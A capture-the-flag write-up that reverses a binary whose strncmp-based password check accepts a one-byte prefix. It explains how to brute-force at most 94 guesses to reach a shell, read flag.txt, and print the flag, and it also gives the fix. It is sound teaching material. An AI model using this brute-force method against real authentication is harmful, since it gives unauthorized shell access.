# Very Security Shell

## Challenge Information

| Field | Value |
| --- | --- |
| Category | Binary Exploitation |
| Difficulty | Easy |
| Points | 463 |
| Author | 櫛風 |
| Connection | `nc chal.thjcc.org 11039` |
| Handout | [`artifacts/chall.zip`](artifacts/chall.zip) |
| Solver | [`solve.py`](solve.py) |
| Flag | `THJCC{strnc0mp_1s_n0t_s3cur3}` |

## Overview

Very Security Shell generates a fresh random 16-character password whenever a
client connects. The password uses all 94 printable non-space ASCII characters,
so guessing the entire value would require an infeasible `94^16` search.

The random generator is not the vulnerability. Authentication fails because
the program compares only as many bytes as the user supplied:

```c
strncmp(input, password, strlen(input))
```

The input must be nonempty, but it does not need to contain all 16 password
characters. A one-character input succeeds whenever it matches the first
password byte. The program keeps the same password after a failed attempt, so
we can try each possible first byte over one connection. At most 94 requests
are needed before the program calls `system("/bin/sh")`.

This is an authentication logic flaw rather than a stack overflow. PIE, NX,
full RELRO, and the stack canary can all remain intact.

## 1. Inspecting the Handout

The archive contains:

```text
Dockerfile
docker-compose.yml
flag.txt
chal
```

Preserve the archive and executable hashes before analysis:

```bash
shasum -a 256 chall.zip
unzip chall.zip
shasum -a 256 chal
file chal
```

```text
6bc121eda5b0d39a0b27e42fceb2b4b04ea0a8607a8eab3a3da96703873c76d6  chall.zip
fdd5a416b65a671d7fc0e97d429840a085ddc88278e78b03a47ef96180b2c7ba  chal

chal: ELF 64-bit LSB pie executable, x86-64, dynamically linked, stripped
```

The protection profile is strong for a small introductory pwn challenge:

| Mitigation | State |
| --- | --- |
| PIE | Enabled |
| NX | Enabled |
| Stack canary | Enabled |
| RELRO | Full |

The ELF is a position-independent `ET_DYN` file. Its GNU stack segment is
read/write but not executable, `__stack_chk_fail` is imported and used, and
the dynamic section requests immediate binding while a GNU RELRO segment
protects the relocation table.

The imported functions point toward authentication logic and an existing shell
path rather than a return-address overwrite:

```text
open
read
close
scanf
strlen
strncmp
system
```

Relevant visible strings include:

```text
/dev/urandom
Welcome to very security shell
please input your password:
%16s
Wrong password.
You input the right password, welcome!
/bin/sh
```

## 2. Reversing Password Generation

The helper beginning at `0x11e9` receives a pointer to a 17-byte destination.
It constructs the following 94-character table on its stack:

```text
0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
```

This is every printable ASCII character from `0x21` through `0x7e`, arranged
with digits and letters first. Space is deliberately excluded because the
password is later read with `%s` semantics.

The helper then opens `/dev/urandom` and reads exactly 16 bytes:

```asm
0x12b7  lea  rax, [0x2008]        ; "/dev/urandom"
0x12c6  call open
...
0x12e4  mov  edx, 0x10
0x12ee  call read
0x12f3  cmp  rax, 0x10
```

For each random byte, the compiler emits an optimized unsigned reduction
modulo 94. In simpler notation, the loop performs:

```c
for (int i = 0; i < 16; i++) {
    password[i] = alphabet[random_bytes[i] % 94];
}
password[16] = '\0';
```

The source is cryptographically strong enough for this purpose. Recovering or
predicting the random bytes is neither practical nor necessary.

## 3. Reconstructing the Authentication Loop

`main` begins at `0x13aa`. Its important local variables are:

```text
rbp - 0x40  generated password[17]
rbp - 0x20  user input[17]
rbp - 0x44  input length
rbp - 0x08  stack canary
```

The password helper is called once at `0x1404`, before the retry loop begins:

```asm
0x13fd  lea  rax, [rbp-0x40]
0x1401  mov  rdi, rax
0x1404  call 0x11e9              ; generate password once
```

The loop prints the banner and reads at most 16 non-whitespace bytes into the
input buffer:

```asm
0x1409  lea  rax, [0x2020]       ; welcome message
0x1413  call puts
0x1418  lea  rax, [0x203f]       ; password prompt
0x1422  call puts
0x1427  lea  rax, [rbp-0x20]
0x142e  lea  rax, [0x205b]       ; "%16s"
0x143d  call scanf
```

`%16s` fits in the 17-byte buffer after the terminating NUL, so this read does
not overflow. The program calculates the supplied length and rejects only an
empty string:

```asm
0x1447  lea  rdi, [rbp-0x20]
0x144e  call strlen
0x1456  cmp  dword [rbp-0x44], 0
0x145a  jg   0x146d
```

The vulnerable comparison is:

```asm
0x146d  movsxd rdx, dword [rbp-0x44] ; n = strlen(input)
0x1473  lea    rcx, [rbp-0x40]       ; password
0x1477  lea    rax, [rbp-0x20]       ; input
0x147b  mov    rsi, rcx
0x147e  mov    rdi, rax
0x1481  call   strncmp
```

Equivalent C is:

```c
size_t length = strlen(input);

if (length > 0 && strncmp(input, password, length) == 0) {
    puts("You input the right password, welcome!");
    system("/bin/sh");
} else {
    puts("Wrong password.");
    goto retry;
}
```

After failure, the jump at `0x14b9` returns to `0x1409`, which is after the
password-generation call. Every guess in one connection is therefore checked
against the same secret.

## 4. Identifying the Prefix-Comparison Flaw

`strncmp(a, b, n)` compares at most `n` bytes. The program incorrectly chooses
`n` from the attacker-controlled input length instead of requiring the full
password length.

For a one-byte input `g`, the check becomes:

```c
strncmp(&g, password, 1) == 0
```

Only this condition matters:

```text
g == password[0]
```

The remaining 15 password characters are never examined. Because every
possible first byte lies in the known printable range `0x21..0x7e`, exhaustive
search needs:

```text
maximum guesses: 94
average guesses: 47.5
```

The correction would be to verify the exact length first and then compare all
16 bytes, preferably with a constant-time equality routine:

```c
if (strlen(input) == 16 && constant_time_equal(input, password, 16)) {
    /* authenticated */
}
```

## 5. Turning the Oracle Into a Shell

The success branch is already present in the executable:

```asm
0x148a  lea  rax, [0x2070]       ; success message
0x1494  call puts
0x1499  lea  rax, [0x2097]       ; "/bin/sh"
0x14a3  call system
```

The Docker image launches the binary through `socat`, so the shell inherits
the network socket as standard input and output. Once a one-byte guess is
accepted, sending this command retrieves the flag and closes the shell:

```sh
cat flag.txt; exit
```

## 6. Automated Exploit

The included [`solve.py`](solve.py) uses only Python's standard library. It
keeps one TCP connection open and proceeds as follows:

1. Wait for the password prompt.
2. Send one candidate byte followed by a newline.
3. If the service prints another password prompt, continue with the next byte.
4. If the success message appears, stop guessing immediately.
5. Send `cat flag.txt; exit` to the inherited shell.
6. Extract and print the `THJCC{...}` value.

The candidate sequence is simply:

```python
ALPHABET = bytes(range(0x21, 0x7F))
```

Run the remote exploit with:

```bash
python3 solve.py
```

The destination can also be supplied positionally:

```bash
python3 solve.py chal.thjcc.org 11039
```

A successful run during the event was:

```text
accepted prefix byte: '*' (0x2a)
flag: THJCC{strnc0mp_1s_n0t_s3cur3}
```

The accepted byte changes on every new connection because the password is
regenerated, but the exploit always finishes within 94 attempts.

## 7. Local Reproduction

The handout includes the original Debian Bookworm container definition. On a
system with Docker available:

```bash
unzip artifacts/chall.zip -d local
cd local
docker compose up --build -d
```

Run the same exploit against the mapped local port:

```bash
python3 ../solve.py 127.0.0.1 1337
```

No address leak, stack corruption, libc dependency, or ROP chain is required.
The exploit is independent of ASLR and all enabled binary mitigations.

## Flag

```text
THJCC{strnc0mp_1s_n0t_s3cur3}
```
